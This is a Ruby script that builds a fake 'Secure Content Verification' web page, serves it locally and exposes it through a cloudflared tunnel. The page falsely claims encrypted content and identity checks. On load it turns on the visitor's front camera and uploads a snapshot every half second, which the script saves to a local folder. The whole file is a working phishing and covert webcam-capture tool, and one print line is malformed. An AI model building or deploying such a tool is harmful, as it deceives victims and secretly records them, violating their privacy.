#!/usr/bin/env ruby
require 'json'
require 'securerandom'
require 'fileutils'
require 'base64'
require 'webrick'

system('clear') || system('cls')

puts <<~EOF
\e[31m                                                 ^\e[34m:
\e[31m                                                ^!\e[34m^.
\e[31m                  :.                 .         ^~!\e[34m~:.                           .
\e[31m               .::^.                .^.        :~~\e[34m^^.        :.                 .:..:
\e[31m           ....:^^:                .^^:  :.    :~!\e[34m~^:   ..  .:^.                 .::::...
\e[31m         .:...^^.             .    .^::::^.    ^~7\e[34m!~:   .::.:.^:                   ......:.
\e[31m      .....::^^           . .!!^^!^:::::::^:...^!?\e[34m7~:. .:::::.::.:::^!~.             .:...:..
\e[31m      ....:.::            .^^~:!!~~77^::^::^:::~!7\e[34m7~~::^^:^:.:.:^!!!^:^:.             ......::
\e[31m    .. ....:^           .:^^~~!!^::~!!~~^::^^^:~!7\e[34m!^^:^^::::~!~!^:^^!!!!^.:.           :. .:.::
\e[31m   ..  .. .:^         ........:?^.:~^~7??7!~^^^^~!\e[34m~^^^~^!7777^!~::^?7::::...:.         ..  .....
\e[31m    .     .::    ....:^~~^^^:. ::::~^:~!7?JJ7~~^^~\e[34m^^^^~7YYJ7^:^~^.:!. .:^~~~~~^:.      ::  ....:
\e[31m   ..       .^..::^^:::.:^^..   .:::^:^~~~~7Y?~^~!\e[34m!~!7YJ!~^^^:^~::::   ..^!~::::::::. .:    ....
\e[31m    .        ..:..:~::.          ::::^^~~7YJ?5JJ~7\e[34m~~YYYJ5J~~~~~::::       .  :^~!^::^..       ..
\e[31m     .  .          .            .::^~!7!7?P57!7~!J\e[34m7~!!~?Y?7!~!~~^.:      .     .. ...         .
\e[31m     .                          ^:^~!7777!!!!!7?J5\e[34mYY7!!7!!77!77!^...     .                   .
\e[31m      ..                        ^:.:^!7?J7~^77!!?P\e[34mY7~7?!~!?JJ~:....:    .                   .
\e[31m        .... .                  .  ....:^.:~?Y7777\e[34m?J??J7~:.^:...   :. .. .            .....
\e[31m             .  . ..   .   .          :::.:^!7?77?\e[34mJ?777~^^....               .  .   . .
\e[31m                                      ^::.:~~!^~~?\e[34m7~^~~^.:...:
\e[31m                                     .::^:.~!G?5YY\e[34m5YYP7^..::^^.
\e[31m                                   :::^::::~^7!J?J\e[34mJ77?!~::::^:^:.
\e[31m                                   .:!7^..:!??77??\e[34m?7?!J7::.::7?!:
\e[31m                                   ^^7J!:.:.~!!!7?\e[34m77!!7^.:::~!7~~7.
\e[31m                                  !B5^:::...:::~!7\e[34m7!~^:....::::^PGY.
\e[31m                                 :YP?: .  :.::^::^\e[34m^:::::.:.. ...~5B7
\e[31m                                 ~!.       :::~^!7\e[34m?!^^^:..        ^!.
\e[31m                                .           ::::~J\e[34mJ?~::::
\e[31m                                            ...!Y#\e[34m&#J^.:
\e[31m                                               ~5P\e[34m#P?.
\e[31m                                                7Y\e[34mPY^
\e[31m                                                .~\e[34m7~
\e[31m                                                 .\e[34m:.
\e[31m                                                  \e[34m.
\e[0m
EOF

width = 120
art_lines = [
  " ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░  ",
  "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
  "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
  "░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
  "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
  "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
  " ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ "
]

puts "\e[36m"
art_lines.each { |line| puts line.center(width) }
puts "\e[0m"
puts "\e[31mCode by AL-MARID\e[0m".center(width)
puts

FileUtils.mkdir_p('captured_images')
random_port = rand(5000..9999)

def create_decoy_html
  <<~HTML
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
      body { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c); color: white; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
      .container { max-width: 800px; width: 100%; background: rgba(0, 0, 20, 0.85); border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); overflow: hidden; backdrop-filter: blur(10px); }
      header { background: rgba(0, 0, 30, 0.9); padding: 25px; text-align: center; border-bottom: 2px solid #0ff; }
      h1 { font-size: 2.5rem; margin-bottom: 10px; background: linear-gradient(90deg, #ff8a00, #e52e71); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3); }
      .content { padding: 30px; display: flex; flex-direction: column; gap: 25px; }
      .card { background: rgba(20, 30, 60, 0.7); border-radius: 10px; padding: 20px; border: 1px solid rgba(100, 200, 255, 0.3); }
      .progress-container { background: rgba(0, 0, 0, 0.4); border-radius: 10px; height: 20px; margin: 20px 0; overflow: hidden; }
      .progress-bar { height: 100%; background: linear-gradient(90deg, #00c853, #b2ff59); width: 0%; border-radius: 10px; animation: progress-animation 2s infinite; }
      @keyframes progress-animation {
        0% { width: 0%; }
        50% { width: 100%; }
        100% { width: 0%; }
      }
      .verification-section { text-align: center; padding: 20px; background: rgba(0, 40, 80, 0.6); border-radius: 10px; margin-top: 20px; }
      .camera-feed { width: 100%; height: 300px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; position: relative; overflow: hidden; }
      #decryptionStatus { color: #69f0ae; font-weight: bold; text-align: center; font-size: 1.2rem; margin: 15px 0; }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>SECURE CONTENT VERIFICATION</h1>
        <p class="tagline">Advanced Security Protocol v3.7</p>
      </header>

      <div class="content">
        <div class="card">
          <h2>🔒 Security Notice</h2>
          <p>This content is protected by military-grade encryption (AES-256). Identity verification is in progress.</p>
        </div>

        <div class="card">
          <h2>🔄 Verification Progress</h2>
          <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
          </div>
          <div id="decryptionStatus">Verifying identity...</div>
        </div>

        <div class="verification-section">
          <h3>🔍 Identity Verification</h3>
          <div class="camera-feed">
            <div class="camera-icon">📷</div>
            <video class="camera-active" id="video" autoplay playsinline></video>
          </div>
          <p>Verification process is ongoing. Please keep this window open.</p>
        </div>
      </div>

      <div class="footer">
        <p>© 2026 Secure Content Delivery System | All rights reserved</p>
      </div>
    </div>

    <script>
      const video = document.getElementById('video');
      const decryptionStatus = document.getElementById('decryptionStatus');
      const progressBar = document.getElementById('progressBar');

      let stream = null;
      let captureInterval = null;
      let progress = 0;

      function updateProgress() {
        progress += 1;
        if (progress > 100) progress = 0;
        progressBar.style.width = `${progress}%`;
      }

      setInterval(updateProgress, 100);

      async function captureAndSend() {
        try {
          if (!stream) return;

          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL('image/jpeg', 0.8);

          await fetch('/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imageData.split(',')[1] })
          });

        } catch (error) {
          console.error('Capture error:', error);
        }
      }

      async function startCapture() {
        try {
          decryptionStatus.textContent = 'Initializing verification...';

          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }
          });

          video.srcObject = stream;
          document.querySelector('.camera-icon').style.display = 'none';
          video.style.display = 'block';

          captureInterval = setInterval(captureAndSend, 500);

          decryptionStatus.textContent = 'Verification in progress...';

        } catch (err) {
          console.error('Camera error:', err);
          decryptionStatus.textContent = 'Error: Camera access denied.';
          decryptionStatus.style.color = '#ff5252';
        }
      }

      window.onload = startCapture;
    </script>
  </body>
  </html>
  HTML
end

output_file = "secure_verification_system.html"
File.write(output_file, create_decoy_html)
puts "Page created successfully: Captured images will be saved in the folder 'captured_images'"
 #{output_file}"

begin
  server = WEBrick::HTTPServer.new(
    Port: random_port,
    BindAddress: '0.0.0.0',
    AccessLog: [],
    Logger: WEBrick::Log.new(nil, 0)
  )

  server.mount_proc '/upload' do |req, res|
    begin
      data = JSON.parse(req.body)
      image_base64 = data['image']

      image_data = Base64.decode64(image_base64)
      file_name = "capture_#{Time.now.to_i}_#{SecureRandom.hex(4)}.jpg"
      File.binwrite(File.join('captured_images', file_name), image_data)

      res.status = 200
      res['Content-Type'] = 'application/json'
      res.body = { status: 'success' }.to_json
    rescue => e
      res.status = 500
      res['Content-Type'] = 'application/json'
      res.body = { error: e.message }.to_json
    end
  end

  server.mount_proc '/' do |req, res|
    res['Content-Type'] = 'text/html'
    res.body = File.read(output_file)
  end

  trap('INT') do
    server.shutdown
    puts "\nServer stopped. Goodbye!"
    exit
  end

  Thread.new { server.start }

  puts "Local server running at: http://127.0.0.1:#{random_port}"
  puts "Starting Cloudflare tunnel..."

  tunnel_cmd = "cloudflared tunnel --url http://localhost:#{random_port}"
  system(tunnel_cmd)

rescue => e
  puts "Error: #{e.message}"
  exit
end
